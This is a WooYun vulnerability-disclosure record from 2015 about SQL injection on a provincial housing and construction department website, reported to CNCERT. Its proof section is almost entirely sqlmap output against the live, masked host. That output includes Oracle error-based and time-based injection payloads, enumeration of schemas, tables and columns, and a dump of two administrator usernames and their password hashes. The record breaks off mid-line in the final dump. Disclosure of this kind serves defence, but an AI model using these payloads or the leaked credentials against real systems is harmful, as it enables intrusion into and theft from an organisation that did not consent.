{"id": 81829, "wybug_id": "wooyun-2015-0152748", "wybug_title": "某省和城乡建设厅某站存在sql注入#跨多库#数据泄露", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-11-12 00:05", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 注入你懂的 详细说明：  一枚注入   引发的 数据泄露   漏洞证明：  注入点：http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID=[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID=    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:53:32[11:53:32] [INFO] testing connection to the target url[11:53:32] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests[11:53:32] [INFO] testing if the url is stable, wait a few seconds[11:53:33] [INFO] url is stable[11:53:33] [INFO] testing if GET parameter 'NewsMagaID' is dynamic[11:53:33] [WARNING] GET parameter 'NewsMagaID' appears to be not dynamic[11:53:34] [WARNING] reflective value(s) found and filtering out[11:53:34] [INFO] heuristic test shows that GET parameter 'NewsMagaID' might beinjectable (possible DBMS: Oracle)[11:53:34] [INFO] testing for SQL injection on GET parameter 'NewsMagaID'[11:53:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[11:53:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[11:53:36] [INFO] GET parameter 'NewsMagaID' is 'Oracle AND error-based - WHEREor HAVING clause (XMLType)' injectable[11:53:36] [INFO] testing 'Oracle AND time-based blind'[11:53:47] [INFO] GET parameter 'NewsMagaID' is 'Oracle AND time-based blind' injectable[11:53:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[11:53:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found[11:53:54] [INFO] target url appears to be UNION injectable with 6 columnsinjection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[11:54:08] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. --dbms=mysql)GET parameter 'NewsMagaID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 65 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[11:54:10] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[11:54:10] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 69 times[11:54:10] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[11:54:10] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 11:54:10[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:54:32[11:54:32] [INFO] resuming back-end DBMS 'oracle'[11:54:32] [INFO] testing connection to the target url[11:54:32] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[11:54:32] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[11:54:32] [INFO] fetching current database[11:54:32] [INFO] retrieved: GJJWZcurrent schema (equivalent to database on Oracle):    'GJJWZ'[11:54:32] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 2 times[11:54:32] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[11:54:32] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 11:54:32============================================================================================[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:54:32[11:54:32] [INFO] resuming back-end DBMS 'oracle'[11:54:32] [INFO] testing connection to the target url[11:54:32] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[11:54:32] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[11:54:32] [INFO] fetching current database[11:54:32] [INFO] retrieved: GJJWZcurrent schema (equivalent to database on Oracle):    'GJJWZ'[11:54:32] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 2 times[11:54:32] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[11:54:32] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 11:54:32[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:55:16[11:55:17] [INFO] resuming back-end DBMS 'oracle'[11:55:17] [INFO] testing connection to the target url[11:55:17] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[11:55:17] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[11:55:17] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[11:55:17] [INFO] fetching database (schema) names[11:55:17] [INFO] the SQL query used returns 22 entries[11:55:18] [INFO] retrieved: CTXSYS[11:55:18] [INFO] retrieved: DBSNMP[11:55:18] [INFO] retrieved: DMSYS[11:55:19] [INFO] retrieved: EXFSYS[11:55:19] [INFO] retrieved: GJJWZ[11:55:20] [INFO] retrieved: HBTJ[11:55:20] [INFO] retrieved: HR[11:55:20] [INFO] retrieved: IX[11:55:21] [INFO] retrieved: MDSYS[11:55:21] [INFO] retrieved: OE[11:55:22] [INFO] retrieved: OLAPSYS[11:55:22] [INFO] retrieved: ORDSYS[11:55:22] [INFO] retrieved: OUTLN[11:55:23] [INFO] retrieved: PM[11:55:23] [INFO] retrieved: SCOTT[11:55:23] [INFO] retrieved: SH[11:55:24] [INFO] retrieved: SYS[11:55:24] [INFO] retrieved: SYSMAN[11:55:25] [INFO] retrieved: SYSTEM[11:55:25] [INFO] retrieved: TSMSYS[11:55:25] [INFO] retrieved: WMSYS[11:55:26] [INFO] retrieved: XDBavailable databases [22]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] GJJWZ[*] HBTJ[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB[11:55:26] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 24 times[11:55:26] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[11:55:26] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 11:55:26============================================================================================[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= -D \"GJJWZ\" --count    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:56:07[11:56:08] [INFO] resuming back-end DBMS 'oracle'[11:56:08] [INFO] testing connection to the target url[11:56:08] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[11:56:08] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[11:56:08] [WARNING] missing table parameter, sqlmap will retrieve the number of entries for all database management system databases' tables[11:56:08] [INFO] fetching tables for database: 'GJJWZ'[11:56:08] [INFO] the SQL query used returns 38 entries[11:56:09] [INFO] retrieved: AREA[11:56:09] [INFO] retrieved: AREALINK[11:56:09] [INFO] retrieved: AREALINKCOUNT[11:56:10] [INFO] retrieved: ARTICLE[11:56:10] [INFO] retrieved: ARTICLE_BAK[11:56:10] [INFO] retrieved: CENTERINFO[11:56:10] [INFO] retrieved: CENTERTYPE[11:56:11] [INFO] retrieved: CLIENTCOUNT[11:56:11] [INFO] retrieved: FK[11:56:11] [INFO] retrieved: IMAGES[11:56:11] [INFO] retrieved: INFOCOUNT[11:56:12] [INFO] retrieved: LINKS[11:56:12] [INFO] retrieved: LOGINCOUNT[11:56:12] [INFO] retrieved: MAPAREA[11:56:12] [INFO] retrieved: MAPINFO[11:56:13] [INFO] retrieved: PERMISSIONS[11:56:13] [INFO] retrieved: PLAN_TABLE[11:56:13] [INFO] retrieved: PROVINCE[11:56:14] [INFO] retrieved: SESSIONSORTTABLE[11:56:14] [INFO] retrieved: SORT[11:56:14] [INFO] retrieved: SORT_BAK[11:56:14] [INFO] retrieved: USERINFO[11:56:15] [INFO] retrieved: VISITTABLE[11:56:15] [INFO] retrieved: WEBSITE[11:56:15] [INFO] retrieved: ZHIGONGACCOUNT[11:56:15] [INFO] retrieved: BUILDING[11:56:16] [INFO] retrieved: CITY[11:56:16] [INFO] retrieved: HX[11:56:16] [INFO] retrieved: ANSWER[11:56:16] [INFO] retrieved: DKJSQDZ[11:56:17] [INFO] retrieved: QUESTION[11:56:17] [INFO] retrieved: QUESTIONTYPE[11:56:17] [INFO] retrieved: NEWSARTICLE[11:56:17] [INFO] retrieved: NEWSLAYOUT[11:56:18] [INFO] retrieved: NEWSMAGAZINES[11:56:18] [INFO] retrieved: SORT_B[11:56:18] [INFO] retrieved: CY[11:56:18] [INFO] retrieved: SYSCONFIG[11:56:19] [INFO] retrieved: 0[11:56:19] [INFO] retrieved: 22[11:56:19] [INFO] retrieved: 22[11:56:19] [INFO] retrieved: 51767[11:56:19] [INFO] retrieved: 4473[11:56:20] [INFO] retrieved: 1142[11:56:20] [INFO] retrieved: 2780[11:56:20] [INFO] retrieved: 19[11:56:20] [INFO] retrieved: 6[11:56:20] [INFO] retrieved: 130[11:56:21] [INFO] retrieved: 927972[11:56:21] [INFO] retrieved: 0[11:56:21] [INFO] retrieved: 1[11:56:21] [INFO] retrieved: 0[11:56:22] [INFO] retrieved: 11[11:56:22] [INFO] retrieved: 19[11:56:22] [INFO] retrieved: 22[11:56:22] [INFO] retrieved: 22[11:56:22] [INFO] retrieved: 0[11:56:23] [INFO] retrieved: 22[11:56:23] [INFO] retrieved: 104[11:56:23] [INFO] retrieved: 135[11:56:23] [INFO] retrieved: 27[11:56:23] [INFO] retrieved: 27[11:56:23] [INFO] retrieved: 0[11:56:24] [INFO] retrieved: 0[11:56:24] [INFO] retrieved: 0[11:56:24] [INFO] retrieved: 75[11:56:24] [INFO] retrieved: 5[11:56:24] [INFO] retrieved: 7[11:56:25] [INFO] retrieved: 60[11:56:25] [INFO] retrieved: 32[11:56:25] [INFO] retrieved: 33[11:56:25] [INFO] retrieved: 1[11:56:25] [INFO] retrieved: 2[11:56:25] [INFO] retrieved: 3566[11:56:26] [INFO] retrieved: 0[11:56:26] [INFO] retrieved: 1Database: GJJWZ+------------------+---------+| Table            | Entries |+------------------+---------+| CLIENTCOUNT      | 927972  || AREALINKCOUNT    | 51767   || ARTICLE          | 4473    || VISITTABLE       | 3566    || BUILDING         | 2780    || ARTICLE_BAK      | 1142    || NEWSARTICLE      | 135     || CITY             | 130     || MAPINFO          | 104     || QUESTION         | 75      || SORT             | 60      || SORT_BAK         | 33      || SORT_B           | 32      || NEWSLAYOUT       | 27      || NEWSMAGAZINES    | 27      || AREA             | 22      || AREALINK         | 22      || INFOCOUNT        | 22      || LINKS            | 22      || MAPAREA          | 22      || CENTERINFO       | 19      || IMAGES           | 19      || HX               | 11      || SESSIONSORTTABLE | 7       || CENTERTYPE       | 6       || QUESTIONTYPE     | 5       || USERINFO         | 2       || DKJSQDZ          | 1       || SYSCONFIG        | 1       || ZHIGONGACCOUNT   | 1       |+------------------+---------+[11:56:26] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 78 times[11:56:26] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[11:56:26] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 11:56:26============================================================================================[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --columns -T \"CLIENTCOUNT\" -D \"GJJWZ\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 11:59:02[11:59:02] [INFO] resuming back-end DBMS 'oracle'[11:59:02] [INFO] testing connection to the target url[11:59:03] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[11:59:03] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[11:59:03] [INFO] fetching columns for table 'CLIENTCOUNT' in database 'GJJWZ'[11:59:03] [INFO] the SQL query used returns 8 entries[11:59:03] [INFO] retrieved: CC_ID[11:59:03] [INFO] retrieved: VARCHAR2[11:59:03] [INFO] retrieved: CC_DATE[11:59:04] [INFO] retrieved: DATE[11:59:04] [INFO] retrieved: CC_IP[11:59:04] [INFO] retrieved: VARCHAR2[11:59:04] [INFO] retrieved: CC_YEAR[11:59:05] [INFO] retrieved: VARCHAR2[11:59:05] [INFO] retrieved: CC_MONTH[11:59:05] [INFO] retrieved: VARCHAR2[11:59:05] [INFO] retrieved: CC_DAY[11:59:06] [INFO] retrieved: VARCHAR2[11:59:06] [INFO] retrieved: CC_URL[11:59:06] [INFO] retrieved: VARCHAR2[11:59:06] [INFO] retrieved: CC_REFURL[11:59:06] [INFO] retrieved: VARCHAR2Database: GJJWZTable: CLIENTCOUNT[8 columns]+-----------+----------+| Column    | Type     |+-----------+----------+| CC_DATE   | DATE     || CC_DAY    | VARCHAR2 || CC_ID     | VARCHAR2 || CC_IP     | VARCHAR2 || CC_MONTH  | VARCHAR2 || CC_REFURL | VARCHAR2 || CC_URL    | VARCHAR2 || CC_YEAR   | VARCHAR2 |+-----------+----------+[11:59:06] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 18 times[11:59:06] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[11:59:06] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 11:59:06============================================================================================[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --columns -T \"USERINFO\" -D \"GJJWZ\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:05:00[12:05:00] [INFO] resuming back-end DBMS 'oracle'[12:05:00] [INFO] testing connection to the target url[12:05:01] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[12:05:01] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[12:05:01] [INFO] fetching columns for table 'USERINFO' in database 'GJJWZ'[12:05:01] [INFO] the SQL query used returns 5 entries[12:05:01] [INFO] retrieved: ID[12:05:01] [INFO] retrieved: VARCHAR2[12:05:02] [INFO] retrieved: NAME[12:05:02] [INFO] retrieved: VARCHAR2[12:05:02] [INFO] retrieved: PASSWORD[12:05:02] [INFO] retrieved: VARCHAR2[12:05:02] [INFO] retrieved: PERMISSIONS[12:05:03] [INFO] retrieved: VARCHAR2[12:05:03] [INFO] retrieved: ADDDATE[12:05:03] [INFO] retrieved: DATEDatabase: GJJWZTable: USERINFO[5 columns]+-------------+----------+| Column      | Type     |+-------------+----------+| ADDDATE     | DATE     || ID          | VARCHAR2 || NAME        | VARCHAR2 || PASSWORD    | VARCHAR2 || PERMISSIONS | VARCHAR2 |+-------------+----------+[12:05:03] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 12 times[12:05:03] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[12:05:03] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 12:05:03============================================================================================[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --dump -C \"PASSWORD\" -T \"USERINFO\" -D \"GJJWZ\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:10:54[12:10:54] [INFO] resuming back-end DBMS 'oracle'[12:10:54] [INFO] testing connection to the target url[12:10:55] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[12:10:55] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[12:10:55] [INFO] fetching entries of column(s) 'PASSWORD' for table 'USERINFO'in database 'GJJWZ'[12:10:55] [INFO] the SQL query used returns 2 entries[12:10:55] [INFO] retrieved: 50E7CA4709D38A070DDD411D501D97C8[12:10:55] [INFO] retrieved: E6C2DC3DEE4A51DCEC3A876AA2339A78[12:10:55] [INFO] analyzing table dump for possible password hashesrecognized possible password hashes in column 'PASSWORD'. Do you want to crack them via a dictionary-based attack? [y/N/q]Database: GJJWZTable: USERINFO[2 entries]+----------------------------------+| PASSWORD                         |+----------------------------------+| 50E7CA4709D38A070DDD411D501D97C8 || E6C2DC3DEE4A51DCEC3A876AA2339A78 |+----------------------------------+[12:10:56] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[12:10:56] [INFO] table 'GJJWZ.USERINFO' dumped to CSV file 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**\\dump\\GJJWZ\\USERINFO.csv'[12:10:56] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 3 times[12:10:56] [INFO] fetched data logged to text files under 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**'[*] shutting down at 12:10:56============================================================================================[root@Hacker~]# Sqlmap -u http://**.**.**.**/NewsPaperLayout.aspx?NewsMagaID= --dump -C \"NAME\" -T \"USERINFO\" -D \"GJJWZ\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:11:44[12:11:45] [INFO] resuming back-end DBMS 'oracle'[12:11:45] [INFO] testing connection to the target url[12:11:45] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: NewsMagaID    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: NewsMagaID=' AND 9765=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(99)||CHR(99)||CHR(116)||CHR(58)||(SELECT (CASE WHEN (9765=9765) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(117)||CHR(109)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND 'SroS'='SroS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: NewsMagaID=' AND 3084=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(98)||CHR(86)||CHR(68),5) AND 'jgCt'='jgCt---[12:11:45] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Oracle[12:11:45] [INFO] fetching entries of column(s) 'NAME' for table 'USERINFO' in database 'GJJWZ'[12:11:45] [INFO] the SQL query used returns 2 entries[12:11:45] [INFO] retrieved: changda[12:11:45] [INFO] retrieved: admin[12:11:45] [INFO] analyzing table dump for possible password hashesDatabase: GJJWZTable: USERINFO[2 entries]+---------+| NAME    |+---------+| changda || admin   |+---------+[12:11:45] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://**.**.**.**/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[12:11:45] [INFO] table 'GJJWZ.USERINFO' dumped to CSV file 'C:\\DOCUME~1\\ADMINI~1\\??\\salmap\\Bin\\output\\**.**.**.**\\dump\\GJJWZ\\USERINFO.csv'[12:11:45] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 3 times[12:11:45] [INFO] fetched data logged to text files under 